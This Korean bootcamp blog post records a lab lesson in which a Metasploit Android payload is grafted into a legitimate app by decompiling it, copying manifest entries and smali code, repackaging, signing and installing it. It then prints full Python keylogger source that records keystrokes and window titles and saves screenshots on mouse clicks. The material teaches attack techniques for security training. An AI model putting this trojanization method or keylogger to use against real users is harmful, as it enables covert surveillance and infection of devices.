---
title: 취약점 진단 및 대응 실무 3日 / SeSAC 성동캠퍼스1기
snippet: "[클라우드 기반의 모빌리티 융합보안 과정] 취약점 진단 및 대응 실무 3日차 수업 정리한 내용입니다."
image: { src: "/assets/img/blog/cover-4.jpg", alt: "Cover Image 4" }
publishDate: "2023-11-22"
category: "security-vulnerability"
tags: [sesac,cloud,skshieldus,security-vulnerability]
---
* toc
{:toc}

<style>.embed-container { position: relative; padding-bottom: 56.25%; height: 0; overflow: hidden; max-width: 100%; } .embed-container iframe, .embed-container object, .embed-container embed { position: absolute; top: 0; left: 0; width: 100%; height: 100%; }</style><div class='embed-container'><iframe src='https://www.youtube.com/embed/d5bbqKYu51w' frameborder='0' allowfullscreen></iframe></div>

## 취약점 진단 및 대응 실무 / 4주차 3일자 수업

### 1. 악성앱을 정상앱 이식

#### 1-1. 악성앱 및 정상앱 디컴파일

![day3-1.png](/assets/img/docs/appsec/day3/1.png){:.lead width="800" height="100" loading="lazy"}
decompile 과정.
{:.figcaption}

지난 시간에 만든 악성앱 metasploit 앱과 이번 시간에 공유 해주신 Root Detect 앱(정상앱)을 디컴파일을 해줍니다.
{:.lead}

#### 1-2. AndroidManifest 및 Main Activity 수정

![day3-2.png](/assets/img/docs/appsec/day3/2.png){:.lead width="800" height="100" loading="lazy"}
악성앱의 AndroidManifest를 Normal앱으로 이식.
{:.figcaption}

![day3-3.png](/assets/img/docs/appsec/day3/3.png){:.lead width="800" height="100" loading="lazy"}
악성앱의 Main Activity를 Normal앱으로 이식.
{:.figcaption}

metasploit앱의 androidmanifest.xml Permission 관련 부분과 mainbroadcasreceiver 및 service 부분을 일부를 정상앱의 androidmanifest.xml로 copy를 해줍니다.
{:.lead}

#### 1-3. smali 패키지 일부 Copy

![day3-4.png](/assets/img/docs/appsec/day3/4.png){:.lead width="800" height="100" loading="lazy"}
악성앱의 smali부분을 Normal앱으로 Copy
{:.figcaption}

또한 metasploit의 Mainactivity일부 smali 코드를 정상앱으로 복사해줍니다.
{:.lead}

#### 1-4. 일반앱을 Re-Compile(Re-package)

![day3-5.png](/assets/img/docs/appsec/day3/5.png){:.lead width="800" height="100" loading="lazy"}
Re-package 과정.
{:.figcaption}

앞서 모든 수정한 값들을 저장하고 repackaging 과정을 진행해줍니다.
{:.lead}

#### 1-5. 일반앱 Signed 과정

![day3-6.png](/assets/img/docs/appsec/day3/6.png){:.lead width="800" height="100" loading="lazy"}
Normal 앱 Signed 과정.
{:.figcaption}

앞서 발급 받은 keystore 키를 가지고, Signed 과정을 진행해줍니다.

#### 1-6. NOX 설치 결과 확인 및 kali metasploit 확인

![day3-7.png](/assets/img/docs/appsec/day3/7.png){:.lead width="800" height="100" loading="lazy"}
Nox 실행 확인.
{:.figcaption}

### 2. python keylogger

#### 2-1. 파이썬으로 keylogger

```python
from pynput import keyboard
from datetime import datetime
import pygetwindow
import pyautogui
import time
import threading

# # print(keyboard)

# def on_press(key):
#     print(key) # key 입력값 출력

# def on_press(key):
#     print(pygetwindow.getActiveWindow().title, datetime.now(), key) # datetime 출력

# def capture():
#     while True:
#         im2 = pyautogui.screenshot(str(datetime.now()).replace(":", "") + "_" + '.png')
#         time.sleep(5) # 화면 capture 출력 

# th = threading.Thread(target = capture, args = ())
# th.start

# def getMouse():
#     with mouse.Listener(on_click = on_click) as listener:
#         listener.join()


# with keyboard.Listener(on_press = on_press, on_release = None) as listener:
#     listener.join()

def on_click(x, y, button, pressed):
    try:                
        pyautogui.screenshot(str(datetime.now()).replace(":","") + "_" + str(x)+ "_" + str(y) +"_.png")
    except:
        pass

def getMouse():
    with mouse.Listener(on_click = on_click) as listener:
        listener.join()
    
def on_press(key):
    print(pygetwindow.getActiveWindow().title, datetime.now(), key)

th = threading.Thread(target = getMouse, args=())
th.start()

with keyboard.Listener(on_press = on_press, on_release = None) as listener:
    listener.join()
```

